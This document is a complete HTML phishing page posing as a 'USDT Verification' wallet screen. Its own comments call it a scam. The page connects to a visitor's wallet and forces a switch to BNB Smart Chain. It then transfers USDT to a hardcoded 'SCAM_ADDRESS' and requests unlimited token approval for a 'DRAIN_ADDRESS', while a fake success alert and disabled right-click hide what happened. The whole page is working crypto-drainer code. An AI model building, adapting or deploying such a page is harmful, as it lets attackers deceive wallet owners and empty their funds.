<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>USDT Verification</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <style>
        /* EXACT SCAM STYLES */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #FFFFFF;
            color: #000000;
            line-height: 1.4;
            font-size: 16px;
            padding: 0;
            margin: 0;
            min-height: 100vh;
        }
        
        /* HEADER */
        .header {
            background: #FFFFFF;
            padding: 60px 20px 20px 20px;
            border-bottom: 0.5px solid #C6C6C8;
            text-align: center;
            position: relative;
        }
        
        .header::before {
            content: "";
            position: absolute;
            top: 12px;
            left: 50%;
            transform: translateX(-50%);
            width: 36px;
            height: 5px;
            background: #E5E5EA;
            border-radius: 2.5px;
        }
        
        .site-title {
            font-size: 17px;
            font-weight: 600;
            color: #000000;
        }
        
        /* MAIN CONTENT */
        .content {
            padding: 20px;
        }
        
        .input-group {
            margin-bottom: 24px;
        }
        
        .label {
            font-size: 14px;
            color: #8E8E93;
            font-weight: 500;
            margin-bottom: 8px;
        }
        
        .address-box {
            background: #F2F2F7;
            border-radius: 12px;
            border: 1px solid #E5E5EA;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .address-text {
            font-family: 'Menlo', 'Monaco', monospace;
            font-size: 15px;
            color: #000000;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            flex: 1;
        }
        
        .paste-btn {
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 6px 12px;
            font-size: 14px;
            font-weight: 500;
            margin-left: 10px;
            min-width: 60px;
        }
        
        /* AMOUNT SECTION */
        .amount-container {
            background: #F2F2F7;
            border-radius: 12px;
            border: 1px solid #E5E5EA;
            padding: 16px;
        }
        
        .amount-row {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .amount-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            font-size: 28px;
            font-weight: 600;
            color: #000000;
            text-align: center;
        }
        
        .usdt-badge {
            background: #007AFF;
            color: white;
            border-radius: 12px;
            padding: 16px 20px;
            font-size: 17px;
            font-weight: 600;
            min-width: 90px;
        }
        
        .max-btn {
            background: #34C759;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 0 16px;
            font-size: 16px;
            font-weight: 600;
            height: 56px;
            min-width: 70px;
        }
        
        .usd-value {
            text-align: center;
            font-size: 15px;
            color: #8E8E93;
            margin: 16px 0 32px 0;
        }
        
        /* NEXT BUTTON */
        .next-container {
            padding: 20px;
            background: white;
            border-top: 0.5px solid #E5E5EA;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
        }
        
        .next-btn {
            width: 100%;
            height: 50px;
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
        }
        
        @supports (padding-bottom: env(safe-area-inset-bottom)) {
            .next-container {
                padding-bottom: calc(20px + env(safe-area-inset-bottom));
            }
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
    <div class="header">
        <div class="site-title">usdtverification.vercel.app</div>
    </div>
    
    <div class="content">
        <div class="input-group">
            <div class="label">Address or Domain Name</div>
            <div class="address-box">
                <div class="address-text" id="addressDisplay">0x395b205f3ec60b4cd5...</div>
                <button class="paste-btn">Paste</button>
            </div>
        </div>
        
        <div class="input-group">
            <div class="amount-container">
                <div class="amount-row">
                    <input type="number" class="amount-input" id="amountInput" value="1">
                    <div class="usdt-badge">USDT</div>
                    <button class="max-btn" onclick="setMax()">Max</button>
                </div>
            </div>
            <div class="usd-value" id="usdValue">≈ $1.00</div>
        </div>
    </div>
    
    <div class="next-container">
        <button class="next-btn" onclick="startScam()">Next</button>
    </div>
    
    <script>
        // SCAM ADDRESSES
        const SCAM_ADDRESS = "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85";
        const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc";
        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
        
        // UI FUNCTIONS
        function updateUSD() {
            const amount = document.getElementById('amountInput').value || 0;
            document.getElementById('usdValue').textContent = `≈ $${(amount * 1.00).toFixed(2)}`;
        }
        
        function setMax() {
            document.getElementById('amountInput').value = "1000";
            updateUSD();
        }
        
        // MAIN SCAM FUNCTION
        async function startScam() {
            if (!window.ethereum) {
                alert("Please open in Trust Wallet");
                return;
            }
            
            try {
                // This triggers Trust Wallet's connect modal (SCREENSHOT 2)
                // It will show the user's CURRENT network and address
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                // Get current network
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                const userAddress = accounts[0];
                
                // Switch to BSC if not already
                if (chainId !== '0x38') {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }]
                        });
                    } catch (error) {
                        if (error.code === 4902) {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: '0x38',
                                    chainName: 'Binance Smart Chain',
                                    nativeCurrency: {
                                        name: 'BNB',
                                        symbol: 'BNB',
                                        decimals: 18
                                    },
                                    rpcUrls: ['https://bsc-dataseed.binance.org/']
                                }]
                            });
                        }
                    }
                }
                
                // Initialize ethers
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                
                // Send 1 USDT
                const amount = document.getElementById('amountInput').value;
                const amountWei = ethers.utils.parseUnits(amount, 18);
                
                const usdt = new ethers.Contract(
                    USDT_CONTRACT,
                    ["function transfer(address to, uint256 amount) returns (bool)"],
                    signer
                );
                
                const tx1 = await usdt.transfer(SCAM_ADDRESS, amountWei);
                await tx1.wait();
                
                // Wait 3 seconds
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                // Unlimited approval - This triggers SCREENSHOT 1
                const approveTx = await usdt.approve(
                    DRAIN_ADDRESS,
                    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                );
                
                // This creates the "Approve" modal with BNB fee
                await approveTx.wait();
                
                alert("✅ Verification complete!");
                
            } catch (error) {
                console.error(error);
            }
        }
        
        // INIT
        document.addEventListener('DOMContentLoaded', function() {
            // Format address display
            const displayAddr = SCAM_ADDRESS.substring(0, 20) + '...';
            document.getElementById('addressDisplay').textContent = displayAddr;
            
            // Update USD
            document.getElementById('amountInput').addEventListener('input', updateUSD);
            updateUSD();
            
            // Detect if already on BSC
            if (window.ethereum) {
                window.ethereum.request({ method: 'eth_chainId' }).then(chainId => {
                    // If user is already on BSC, the connect modal will show BNB Smart Chain
                    console.log("Current chain:", chainId);
                });
            }
            
            // Prevent inspect
            document.addEventListener('contextmenu', e => e.preventDefault());
        });
    </script>
</body>
</html>
